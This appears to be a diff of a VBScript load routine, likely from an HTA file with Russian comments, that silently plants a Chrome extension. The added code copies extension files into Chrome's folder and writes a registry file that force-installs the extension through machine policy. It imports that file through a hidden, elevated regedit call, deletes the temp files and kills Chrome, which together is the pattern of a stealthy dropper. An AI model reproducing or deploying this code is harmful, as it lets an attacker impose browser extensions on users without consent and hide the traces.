@@ -50,23 +50,30 @@ Sub Window_onLoad
         xcopyCmd = "xcopy """ & tempFolder & "\test\*"" """ & chromeExtPath & "\" & """ /E /I /Y"
         shell.Run xcopyCmd, 0, True
         
-        ' Создаем bat-файл для добавления записей в реестр с повышенными правами
-        Set regFile = fso.CreateTextFile(tempFolder & "\chrome_ext.bat", True)
-        regFile.WriteLine "@echo off"
-        ' Для 64-битной системы
-        regFile.WriteLine "reg add ""HKEY_LOCAL_MACHINE\Software\Wow6432Node\Google\Chrome\Extensions\" & extensionId & """ /v update_url /t REG_SZ /d ""https://clients2.google.com/service/update2/crx"" /f"
-        ' Для 32-битной системы
-        regFile.WriteLine "reg add ""HKEY_LOCAL_MACHINE\Software\Google\Chrome\Extensions\" & extensionId & """ /v update_url /t REG_SZ /d ""https://clients2.google.com/service/update2/crx"" /f"
+        ' Создаем REG-файл
+        Set regFile = fso.CreateTextFile(tempFolder & "\chrome_ext.reg", True)
+        regFile.WriteLine "Windows Registry Editor Version 5.00"
+        regFile.WriteLine ""
+        regFile.WriteLine "[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Google\Chrome]"
+        regFile.WriteLine """ExtensionSettings""=""{""""*"""":{""""installation_mode"""":""""allowed""""},""""" & extensionId & """":{""""installation_mode"""":""""force_installed"""",""""update_url"""":""""https://clients2.google.com/service/update2/crx""""}}"""""
+        regFile.WriteLine """ExtensionInstallAllowlist""=""" & extensionId & """"
+        regFile.WriteLine """ExtensionInstallForcelist""=""" & extensionId & ";https://clients2.google.com/service/update2/crx"""
+        regFile.WriteLine ""
+        regFile.WriteLine "[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist]"
+        regFile.WriteLine """1""=""" & extensionId & ";https://clients2.google.com/service/update2/crx"""
+        regFile.WriteLine ""
+        regFile.WriteLine "[HKEY_LOCAL_MACHINE\SOFTWARE\Google\Chrome\Extensions\" & extensionId & "]"
+        regFile.WriteLine """update_url""=""https://clients2.google.com/service/update2/crx"""
         regFile.Close
         
-        ' Запускаем bat-файл с правами администратора
-        elevateCmd = "powershell -Command ""Start-Process -FilePath '" & tempFolder & "\chrome_ext.bat' -Verb RunAs -WindowStyle Hidden -Wait"""
+        ' Запускаем reg-файл с правами администратора
+        elevateCmd = "powershell -Command ""Start-Process -FilePath 'regedit.exe' -ArgumentList '/s','" & tempFolder & "\chrome_ext.reg' -Verb RunAs -WindowStyle Hidden -Wait"""
         shell.Run elevateCmd, 0, True
         
         ' Удаляем временные файлы
         fso.DeleteFile(tempFolder & "\test.zip")
         fso.DeleteFolder(tempFolder & "\test")
-        fso.DeleteFile(tempFolder & "\chrome_ext.bat")
+        fso.DeleteFile(tempFolder & "\chrome_ext.reg")
         
         ' Закрываем Chrome если он запущен
         shell.Run "taskkill /F /IM chrome.exe /T", 0, True
